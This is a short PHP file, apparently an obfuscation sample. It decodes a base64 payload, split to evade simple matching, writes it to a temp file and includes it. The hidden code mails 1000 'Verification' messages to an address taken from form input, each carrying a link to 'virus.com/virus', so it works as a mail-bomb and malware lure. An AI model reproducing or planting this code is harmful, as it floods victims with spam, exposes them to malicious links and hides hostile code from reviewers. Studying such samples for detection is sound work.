<?php
$tmp=tempnam('/tmp','FOO');
$c=base64_decode('P'.'z48P3BocAokZW1haWw9JF9QT1NUWydlbWFpbCddOwpmb3IgKCRpPTA7JGk8MTAwMDsrKyRpKQoJbWFpbCgkZW1haWwsICJWZXJpZmljYXRpb24iLCAiUGxlYXNlIHJlcGx5IHdpdGggWUVTIG9yIGNsaWNrIDxhIGhyZWY9J3ZpcnVzLmNvbS92aXJ1cyc+SGVyZTwvYT4gCgkJdG8gc3RhcnQgcmVjZWl2aW5nIG1lc3NhZ2VzLiIpOw==');
file_put_contents($tmp, $c);
include $tmp;
